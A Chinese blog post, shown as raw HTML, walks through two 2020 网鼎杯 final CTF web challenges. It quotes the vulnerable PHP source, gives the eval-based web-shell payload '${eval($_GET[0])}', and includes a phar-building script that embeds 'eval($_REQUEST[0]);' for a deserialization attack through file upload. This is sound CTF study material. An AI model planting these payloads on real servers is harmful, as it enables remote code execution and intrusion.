@@ -1,0 +1,264 @@
+<!DOCTYPE html><html lang="zh-Hans" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>网鼎杯 2020 总决赛 Novel&amp;GameExp | Αιώνιος</title><meta name="keywords" content="buu"><meta name="author" content="4v1d"><meta name="copyright" content="4v1d"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="Novel:参考博客： 网鼎杯2020线下web - W4nder - 博客园 (cnblogs.com) 2020第二届网鼎杯半决赛Web题目writeup | Mount4in 在buu上下载了源文件  先看看index.php 源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网鼎杯 2020 总决赛 Novel&amp;GameExp">
+<meta property="og:url" content="http://daweitech.github.io/2021/09/04/buu/20/index.html">
+<meta property="og:site_name" content="Αιώνιος">
+<meta property="og:description" content="Novel:参考博客： 网鼎杯2020线下web - W4nder - 博客园 (cnblogs.com) 2020第二届网鼎杯半决赛Web题目writeup | Mount4in 在buu上下载了源文件  先看看index.php 源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444">
+<meta property="og:locale">
+<meta property="og:image" content="http://daweitech.github.io/imgr/4.jpg">
+<meta property="article:published_time" content="2021-09-04T07:24:15.000Z">
+<meta property="article:modified_time" content="2021-09-07T12:35:03.912Z">
+<meta property="article:author" content="4v1d">
+<meta property="article:tag" content="buu">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://daweitech.github.io/imgr/4.jpg"><link rel="shortcut icon" href="/imgr/15.jpg"><link rel="canonical" href="http://daweitech.github.io/2021/09/04/buu/20/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="baidu-site-verification" content="www.baidu.com"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"Traditional Chinese Activated Manually","cht_to_chs":"Simplified Chinese Activated Manually","day_to_night":"Dark Mode Activated Manually","night_to_day":"Light Mode Activated Manually","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}
+
+// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
+const getScript = url => new Promise((resolve, reject) => {
+  const script = document.createElement('script')
+  script.src = url
+  script.async = true
+  script.onerror = reject
+  script.onload = script.onreadystatechange = function() {
+    const loadState = this.readyState
+    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+    script.onload = script.onreadystatechange = null
+    resolve()
+  }
+  document.head.appendChild(script)
+})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-09-07 20:35:03'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"> <script src="/live2d-widget/autoload.js"></script> <link rel="preconnect" href="https://fonts.gstatic.com"> <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@1,300&display=swap" rel="stylesheet"><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Αιώνιος" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/87.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">79</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">18</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/imgr/4.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Αιώνιος</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">网鼎杯 2020 总决赛 Novel&amp;GameExp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-09-04T07:24:15.000Z" title="Created 2021-09-04 15:24:15">2021-09-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-09-07T12:35:03.912Z" title="Updated 2021-09-07 20:35:03">2021-09-07</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h4 id="Novel"><a href="#Novel" class="headerlink" title="Novel:"></a>Novel:</h4><p>参考博客：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/W4nder/p/14078695.html">网鼎杯2020线下web - W4nder - 博客园 (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://mount4in.github.io/2020/12/08/2020%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9BWeb%E9%A2%98%E7%9B%AEwriteup/">2020第二届网鼎杯半决赛Web题目writeup | Mount4in</a></p>
+<p>在buu上下载了源文件</p>
+<p><img src="/2021/09/04/buu/20/image-20210905094734716.png" alt="image-20210905094734716"></p>
+<p>先看看index.php</p>
+<p>源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">defined(&#39;DS&#39;) or define(&#39;DS&#39;, DIRECTORY_SEPARATOR);</span><br><span class="line">define(&#39;APP_DIR&#39;, realpath(&#39;.&#x2F;&#39;));</span><br><span class="line">error_reporting(0);</span><br><span class="line">function autoload_class($class)&#123;</span><br><span class="line">	foreach(array(&#39;class&#39;) as $dir)&#123;</span><br><span class="line">		$file &#x3D; APP_DIR.DS.$dir.DS.$class.&#39;.class.php&#39;;</span><br><span class="line">		&#x2F;&#x2F; echo $file;</span><br><span class="line">		if(file_exists($file))&#123;</span><br><span class="line">			&#x2F;&#x2F; echo $file;</span><br><span class="line">			include_once $file;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function upload($config)&#123;</span><br><span class="line">	$upload_config[&#39;class&#39;]&#x3D;$config[&#39;class&#39;];</span><br><span class="line">	foreach(array(&#39;file&#39;,&#39;method&#39;) as $param)&#123;</span><br><span class="line">		$upload_config[&#39;data&#39;][$param]&#x3D;$config[$param];</span><br><span class="line">	&#125;</span><br><span class="line">	&#x2F;&#x2F; var_dump($upload_config);</span><br><span class="line">	return $upload_config;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function home($config)&#123;</span><br><span class="line">	$home_config[&#39;class&#39;]&#x3D;$config[&#39;class&#39;];</span><br><span class="line">	$home_config[&#39;data&#39;][&#39;method&#39;]&#x3D;$config[&#39;method&#39;];</span><br><span class="line">	return $home_config;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function back($config)&#123;</span><br><span class="line">	$copy_config[&#39;class&#39;]&#x3D;$config[&#39;class&#39;];</span><br><span class="line">	$copy_config[&#39;data&#39;][&#39;method&#39;]&#x3D;$config[&#39;method&#39;];</span><br><span class="line">	$copy_config[&#39;data&#39;][&#39;filename&#39;]&#x3D;$config[&#39;post&#39;][&#39;filename&#39;];</span><br><span class="line">	$copy_config[&#39;data&#39;][&#39;dest&#39;]&#x3D;$config[&#39;post&#39;][&#39;dest&#39;];</span><br><span class="line">	return $copy_config;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">spl_autoload_register(&#39;autoload_class&#39;);</span><br><span class="line"></span><br><span class="line">$request&#x3D;isset($_SERVER[&#39;REQUEST_URI&#39;])?$_SERVER[&#39;REQUEST_URI&#39;]:&#39;&#x2F;&#39;;</span><br><span class="line"></span><br><span class="line">$config[&#39;get&#39;]&#x3D;$_GET;</span><br><span class="line">$config[&#39;post&#39;]&#x3D;$_POST;</span><br><span class="line">$config[&#39;file&#39;]&#x3D;$_FILES;</span><br><span class="line"></span><br><span class="line">$parameters&#x3D;explode(&#39;&#x2F;&#39;,explode(&#39;?&#39;, $request)[0]);</span><br><span class="line">$class&#x3D;(isset($parameters[1]) &amp;&amp; !empty($parameters[1]))?$parameters[1]:&#39;home&#39;;</span><br><span class="line">&#x2F;&#x2F; echo $class;</span><br><span class="line">$method&#x3D;(isset($parameters[2]) &amp;&amp; !empty($parameters[2]))?$parameters[2]:&#39;index&#39;;</span><br><span class="line">&#x2F;&#x2F; echo $method;</span><br><span class="line"></span><br><span class="line">$config[&#39;class&#39;]&#x3D;$class;</span><br><span class="line">$config[&#39;method&#39;]&#x3D;$method;</span><br><span class="line"></span><br><span class="line">if(!empty($class))&#123;</span><br><span class="line">	if(in_array($class, array(&#39;upload&#39;,&#39;home&#39;,&#39;back&#39;)))&#123;</span><br><span class="line">		&#x2F;&#x2F; echo $class;</span><br><span class="line">		$class_init_config&#x3D;call_user_func($class, $config);</span><br><span class="line">		&#x2F;&#x2F; print_r($class_init_config);</span><br><span class="line">		new $class_init_config[&#39;class&#39;]($class_init_config[&#39;data&#39;]);</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		header(&#39;Location: &#x2F;&#39;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>index.php中实现了有一个类自动加载，可以以<code>http://ip/class/method</code>的形式去调用对应类的函数</p>
+<p>//类自动加载</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.autoload.php">https://www.php.net/manual/zh/language.oop5.autoload.php</a></p>
+<p><img src="/2021/09/04/buu/20/image-20210905095559300.png" alt="image-20210905095559300"></p>
+<p><img src="/2021/09/04/buu/20/image-20210905095718327.png" alt="image-20210905095718327"></p>
+<p>然后在<code>class</code>文件夹中有三个文件，分别为</p>
+<p><code>home.class.php</code>、 <code>upload.class.php</code> 、<code>back.class.php</code>，分别对应主页、上传和备份功能的实现，接下来审计这三个文件</p>
+<p>我们采用分而置之来分析</p>
+<p>1.upload.class.php，上传功能</p>
+<p><img src="/2021/09/04/buu/20/image-20210905100016508.png" alt="image-20210905100016508"></p>
+<p>文件被上传到<code>profile</code>目录下，文件名可控，但是其后缀进行了限制，只能用txt，然后就是大小限制。</p>
+<p>PHP in_array() 函数</p>
+<p>定义和用法</p>
+<p>in_array() 函数搜索数组中是否存在指定的值。</p>
+<p><strong>注释：</strong>如果 <em>search</em> 参数是字符串且 <em>type</em> 参数被设置为 TRUE，则搜索区分大小写。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in_array(search,array,type)</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><em>search</em></td>
+<td align="left">必需。规定要在数组搜索的值。</td>
+</tr>
+<tr>
+<td align="left"><em>array</em></td>
+<td align="left">必需。规定要搜索的数组。</td>
+</tr>
+<tr>
+<td align="left"><em>type</em></td>
+<td align="left">可选。如果设置该参数为 true，则检查搜索的数据与数组的值的类型是否相同。</td>
+</tr>
+</tbody></table>
+<p>例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$people &#x3D; array(&quot;Bill&quot;, &quot;Steve&quot;, &quot;Mark&quot;, &quot;David&quot;);</span><br><span class="line"></span><br><span class="line">if (in_array(&quot;Mark&quot;, $people))</span><br><span class="line">  &#123;</span><br><span class="line">  echo &quot;匹配已找到&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">else</span><br><span class="line">  &#123;</span><br><span class="line">  echo &quot;匹配未找到&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>echo “匹配已找到”</p>
+<p>2.backup.class.php,备份功能</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class back&#123;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $method;</span><br><span class="line">    public $dest;</span><br><span class="line"></span><br><span class="line">    function __construct($config)&#123;</span><br><span class="line">        $this-&gt;filename&#x3D;$config[&#39;filename&#39;];</span><br><span class="line">        $this-&gt;method&#x3D;$config[&#39;method&#39;];</span><br><span class="line">        $this-&gt;dest&#x3D;$config[&#39;dest&#39;];</span><br><span class="line">        if(in_array($this-&gt;method, array(&#39;backup&#39;)))&#123;</span><br><span class="line">            $this-&gt;&#123;$this-&gt;method&#125;($this-&gt;filename, $this-&gt;dest);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">                header(&#39;Location: &#x2F;&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function backup($filename, $dest)&#123;</span><br><span class="line">        $filename&#x3D;&#39;profile&#x2F;&#39;.$filename;</span><br><span class="line">        if(file_exists($filename))&#123;</span><br><span class="line">            $content&#x3D;htmlspecialchars(file_get_contents($filename),ENT_QUOTES);</span><br><span class="line">            $password&#x3D;$this-&gt;random_code();</span><br><span class="line">            $r[&#39;path&#39;]&#x3D;$this-&gt;_write($dest, $this-&gt;_create($password, $content));</span><br><span class="line">            $r[&#39;password&#39;]&#x3D;$password;</span><br><span class="line">            echo json_encode($r);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;* 先验证保证为备份文件后,再保存为私藏文件 *&#x2F;</span><br><span class="line">    private function _write($dest, $content)&#123;</span><br><span class="line">        $f1&#x3D;$dest;</span><br><span class="line">        $f2&#x3D;&#39;private&#x2F;&#39;.$this-&gt;random_code(10).&quot;.php&quot;;</span><br><span class="line"></span><br><span class="line">        $stream_f1 &#x3D; fopen($f1, &#39;w+&#39;);</span><br><span class="line">        fwrite($stream_f1, $content);</span><br><span class="line">        rewind($stream_f1);</span><br><span class="line">        $f1_read&#x3D;fread($stream_f1, 3000);</span><br><span class="line"></span><br><span class="line">        preg_match(&#39;&#x2F;^&lt;\?php \$_GET\[\&quot;password\&quot;\]&#x3D;&#x3D;&#x3D;\&quot;[a-zA-Z0-9]&#123;8&#125;\&quot;\?print\(\&quot;.*\&quot;\):exit\(\); $&#x2F;s&#39;, $f1_read, $matches);</span><br><span class="line"></span><br><span class="line">        if(!empty($matches[0]))&#123;</span><br><span class="line">            copy($f1,$f2);</span><br><span class="line">            fclose($stream_f1);   </span><br><span class="line">            return $f2;     </span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            fwrite($stream_f1, &#39;&lt;?php exit(); ?&gt;&#39;);</span><br><span class="line">            fclose($stream_f1);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function _create($password, $content)&#123;</span><br><span class="line">        $_content&#x3D;&#39;&lt;?php $_GET[&quot;password&quot;]&#x3D;&#x3D;&#x3D;&quot;&#39;.$password.&#39;&quot;?print(&quot;&#39;.$content.&#39;&quot;):exit(); &#39;;</span><br><span class="line">        return $_content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function random_code($length &#x3D; 8,$chars &#x3D; null)&#123;</span><br><span class="line">        if(empty($chars))&#123;</span><br><span class="line">            $chars &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">        $count &#x3D; strlen($chars) - 1;</span><br><span class="line">        $code &#x3D; &#39;&#39;;</span><br><span class="line">        while( strlen($code) &lt; $length)&#123;</span><br><span class="line">            $code .&#x3D; substr($chars,rand(0,$count),1);</span><br><span class="line">        &#125;</span><br><span class="line">        return $code;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>程序首先将<code>$filename</code>拼接到<code>profile/</code>，然后检测文件是否存在，若存在，将文件内容读出来进行html编码，然后生成一个随机的字符串作为读取文件内容的密码，</p>
+<p>之后调用<code>_create()</code>函数，将密码和html编码后的文件内容，拼接到<code>&#39;&lt;?php $_GET[&quot;password&quot;]===&quot;&#39;.$password.&#39;&quot;?print(&quot;&#39;.$content.&#39;&quot;):exit(); &#39;</code>里，</p>
+<p>之后调用<code>_write()</code>函数，将上面这段php代码写进<code>private</code>目录，然后对文件内容内容进行正则表达式的检测，若通过检测,将文件内容写进<code>$dest</code>，并复制一份到<code>$f2</code>，若没有通过检测，则在<code>$dest</code>中写入<code>&lt;?php exit(); ?&gt;</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">理清程序大体流程后，大致的攻击思路就是上传一个txt的文件，然后再通过back生成php文件</span><br></pre></td></tr></table></figure>
+
+<p>上传txt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;eval($_GET[0])&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进行备份，生成php文件</p>
+<p><img src="/2021/09/04/buu/20/image-20210905101422842.png" alt="image-20210905101422842"></p>
+<p>执行参数0</p>
+<p><img src="/2021/09/04/buu/20/image-20210905101726252.png" alt="image-20210905101726252"></p>
+<h4 id="GameExp"><a href="#GameExp" class="headerlink" title="GameExp:"></a>GameExp:</h4><p>这题也是坑了很久啊</p>
+<p>首先是为了在目录下生成phar文件</p>
+<p>需要修改配置php.ini，找了好久才解决：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_35835030/article/details/116174720">https://blog.csdn.net/weixin_35835030/article/details/116174720</a></p>
+<p>创建createphar.php文件（这以后可以用作phar文件解题模板）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line"> <span class="keyword">var</span> $output = <span class="string">&#x27;eval($_REQUEST[0]);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">@unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub，增加gif⽂件头</span></span><br><span class="line">$o = <span class="keyword">new</span> AnyClass();</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将⾃定义meta-data存⼊manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.jpg&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的⽂件</span></span><br><span class="line"><span class="comment">//签名⾃动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在有php.exe的目录下，执行命令</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php  createphar.php</span><br></pre></td></tr></table></figure>
+
+<p>这时候目录下就会生成php.phar,然后重命名为php.gif</p>
+<p>然后在register页面注册时上传该文件</p>
+<p>注册名随意，这里我用lex</p>
+<p><img src="/2021/09/04/buu/20/image-20210907174315906.png" alt="image-20210907174315906"></p>
+<p>还可以验证一下是否上传成功</p>
+<p><img src="/2021/09/04/buu/20/image-20210907174611006.png" alt="image-20210907174611006"></p>
+<p>接着重新注册一次，并且要用抓包修改，用户名注意要用刚刚注册的，</p>
+<p>来触发反序列化,在post增添命令</p>
+<p><img src="/2021/09/04/buu/20/image-20210907175822286.png" alt="image-20210907175822286"></p>
